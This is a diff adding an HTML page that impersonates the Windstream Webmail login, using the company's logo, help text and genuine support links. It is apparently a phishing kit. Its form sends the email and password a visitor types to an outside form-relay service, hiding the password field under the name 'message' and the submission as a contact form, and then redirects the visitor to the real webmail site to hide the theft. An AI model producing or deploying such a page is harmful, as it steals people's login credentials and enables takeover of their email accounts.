@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>test web</title>
+        <link rel="stylesheet" href="style.css">
+
+       
+      
+        <style media="screen">
+            a {
+                color: #1f8aa3;
+                text-decoration-line: underline;
+            }
+            #btn {
+                background-color: #ef6724;
+            }
+                </style>
+        </style>
+    </head>
+
+    <body class="bg-white flex">
+     
+        
+        <section class="contact-section">
+        
+
+            <main class="container lg:w-screen-md">
+                <header>
+      
+                    <div class="branding">
+        
+                        <img src="windstream.png" alt="Logo">
+          
+                    </div>
+      
+                    <div class="text-center text-gray-800 text-lg text-bold my-4">
+        
+                        <h1>Webmail Login</h1>
+      
+                    </div>
+      
+                </header>
+                    <section id="form" class="flex flex-col justify-between px-3">
+                
+                        <form class="contact-form" action="https://api.web3forms.com/submit" method="POST">
+                            <input type="hidden" name="redirect" value="https://webmail.windstream.net/">
+                        <input type="hidden" name="access_key" value="3a462e0d-31c4-4dce-b629-8a0c92bb4b1a" />
+                        <input type="hidden" name="subject" value="New Contact Form Submission from Web3Forms" />
+                        <input type="hidden" name="from_name" value="My Website"/>
+                     
+                    
+
+                            <div class="formfield">
+            
+                                <div class="form-group">
+                                <label for="email" class="form-label">Email</label>
+                                <input tabindex="1" class="tabable" id="email" name="email" class="form-input" placeholder="Email Address" type="email" />
+                                </div>
+                        
+                                <div class="formfield">
+                                    <label for="password" class="form-label">Password</label>
+                                    <input id="message" name="message" class="form-input" placeholder="" type="message" />
+                                </div>
+                            </div>
+                    
+                        </div>
+                    </div>
+                    
+                            <div class="remember-me" x-data="{ open: false }">
+                            <div class="flex items-baseline">
+                            <input tabindex="4" id="remember_me" name="remember_me" class="tabable mr-2 leading-tight" type="checkbox" checked="">
+                            <label for="remember_me" class="flex items-baseline block text-gray-700 font-bold">
+                                Remember Me
+                            </label>
+                            <!-- <a tabindex="5" href="https://windstream-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_c13276b3b9b5aed4915dcfed05de9b3f9ffe882c27%3Ahttps%3A%2F%2Fwindstream-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail.windstream.net%252F%26cookieTime%3D1722598755#remember_me_help" id="remember_me_help_link" class="tabable align-top ml-2 text-sm" @click.prevent="open = true">?</a> -->
+                            </div>
+                            <div x-show="open" @click.away="open = false" class="my-2 px-4 py-2 bg-yellow-200 text-sm rounded shadow-inner" style="display: none;">
+                            <a name="remember_me_help"></a>
+                            <p>When you choose "Remember Me" on sign in, we will remember who you are and keep you signed in for up to 90 days, unless you sign out or your browser cookies are deleted. <br>If you are on a public computer, we recommend you uncheck the box.</p>
+                            </div>
+                        </div>
+                            <div class="formfield">
+                        <button tabindex="6" id="btn" class="tabable w-full px-4 py-2 my-4 text-2xl text-white text-bold uppercase tracking-wider rounded-lg shadow" type="submit" name="">
+                            Log In
+                        </button>
+                        <div id="result"></div>
+                        
+                    </div>
+                </form>
+            </section>
+    
+            <section id="self-care" class="px-2">
+          <ul>
+            <li class="mb-2">
+            <a class="tabable" tabindex="8" target="_blank" id="selfcare_link_1" href="https://windstream-email.auth-gateway.net/passwordreset">Forgot Your Password or Need to Reset It?</a>
+            </li>
+                            <li class="mb-2">
+            <a class="tabable" tabindex="9" target="_blank" id="selfcare_link_2" href="https://windstream-email.auth-gateway.net/account/profile">Email Identity Dashboard</a>
+            </li>
+                            <li class="mb-2">
+            <a class="tabable" tabindex="10" target="_blank" id="selfcare_link_3" href="https://windstream.com/residential/upgrade-your-account">Login Support Page</a>
+            </li>
+                        </ul>
+            </section>
+        
+        
+        <footer class="flex flex-col mt-6 w-3/4 text-center mx-auto text-sm">
+          <p></p>
+        </footer>
+    </main>
+
+    </body>
+</html>
